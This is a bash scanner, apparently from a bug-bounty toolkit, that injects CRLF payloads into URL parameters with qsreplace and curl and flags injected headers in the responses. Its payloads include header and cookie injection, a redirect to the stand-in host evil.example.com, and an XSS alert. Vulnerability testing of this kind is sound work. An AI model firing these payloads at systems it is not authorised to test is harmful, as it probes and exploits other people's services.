#!/usr/bin/env bash
# hunt-crlf-inject.sh — CRLF injection detection via qsreplace + curl
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../configs/tool-profiles.sh" 2>/dev/null || true

TARGET="${1:-}"
[ -z "$TARGET" ] && { echo "Usage: $0 <target-url>"; exit 1; }

OUT_DIR="${OUT_DIR:-./crlf_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$TARGET" | sed 's|https\?://||;s|[/:?&=]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

hit() { echo "🔴 $*" | tee -a "$OUT"; }

# ─── Collect URLs ───────────────────────────────────────────────
# Prefer sibling crawler outputs; fall back to TARGET itself.
URLS_FILE=$(mktemp)
trap 'rm -f "$URLS_FILE"' EXIT

TARGET_SLUG=$(echo "$TARGET" | sed 's|https\?://||;s|[/:].*||')

for candidate in \
  "$SCRIPT_DIR/../katana_out/${TARGET_SLUG}.txt" \
  "$SCRIPT_DIR/../gau_out/${TARGET_SLUG}.txt" \
  "$SCRIPT_DIR/../wayback_out/${TARGET_SLUG}.txt" \
  "./katana_out/${TARGET_SLUG}.txt" \
  "./gau_out/${TARGET_SLUG}.txt" \
  "./wayback_out/${TARGET_SLUG}.txt"
do
  if [ -f "$candidate" ]; then
    cat "$candidate" >> "$URLS_FILE"
  fi
done

# If no sibling outputs found, use TARGET directly
if [ ! -s "$URLS_FILE" ]; then
  echo "$TARGET" > "$URLS_FILE"
fi

# Only keep URLs with query parameters (qsreplace needs them)
PARAM_URLS=$(grep '?' "$URLS_FILE" | sort -u)
if [ -z "$PARAM_URLS" ]; then
  # No parameterised URLs found — still probe TARGET bare
  PARAM_URLS="$TARGET"
fi

# ─── Payloads ───────────────────────────────────────────────────
declare -A PAYLOADS
PAYLOADS[basic]="%0d%0aInjected-Header:bbflow"
PAYLOADS[xss]="%0d%0a%0d%0a<script>alert(1)</script>"
PAYLOADS[cookie]="%0aSet-Cookie:crlftest=1"
PAYLOADS[redirect]="%0d%0aLocation:https://evil.example.com"
PAYLOADS[literal]=$'\r\nInjected:bbflow'
PAYLOADS[utf8]="%E5%98%8A%E5%98%8DInjected:bbflow"

# ─── Scanner ────────────────────────────────────────────────────
probe_url() {
  local injected_url="$1"
  local payload_name="$2"

  local headers_file
  headers_file=$(mktemp)

  local body
  body=$(curl -sk \
    -A "$CURL_UA" \
    -m "${CURL_TIMEOUT:-10}" \
    -D "$headers_file" \
    -L \
    "$injected_url" 2>/dev/null)

  local headers
  headers=$(cat "$headers_file")
  rm -f "$headers_file"

  # Check each indicator
  if echo "$headers" | grep -qi "^Injected-Header: bbflow"; then
    hit "[${payload_name}] CRLF confirmed — Injected-Header: bbflow in response | $injected_url"
  fi

  if echo "$headers" | grep -qi "^Set-Cookie: crlftest="; then
    hit "[${payload_name}] Cookie injection — crlftest cookie set | $injected_url"
  fi

  if echo "$headers" | grep -qi "^Location: https://evil.example.com"; then
    hit "[${payload_name}] Header redirect injection — Location: evil.example.com | $injected_url"
  fi

  if echo "$headers" | grep -qi "^Injected: bbflow"; then
    hit "[${payload_name}] CRLF confirmed (literal/UTF-8) — Injected: bbflow in response | $injected_url"
  fi

  # XSS via CRLF: check body for injected script (only flag if it's our payload)
  if echo "$body" | grep -q "<script>alert(1)</script>"; then
    hit "[${payload_name}] XSS via CRLF — <script>alert(1)</script> in response body | $injected_url"
  fi
}

# ─── Main loop ──────────────────────────────────────────────────
while IFS= read -r url; do
  [ -z "$url" ] && continue
  # Skip URLs without params for payload injection (qsreplace only mutates values)
  if ! echo "$url" | grep -q '?'; then
    continue
  fi

  for payload_name in "${!PAYLOADS[@]}"; do
    payload="${PAYLOADS[$payload_name]}"
    injected=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
    if [ -z "$injected" ] || [ "$injected" = "$url" ]; then
      continue
    fi
    probe_url "$injected" "$payload_name"
    sleep 0.1
  done
done <<< "$PARAM_URLS"
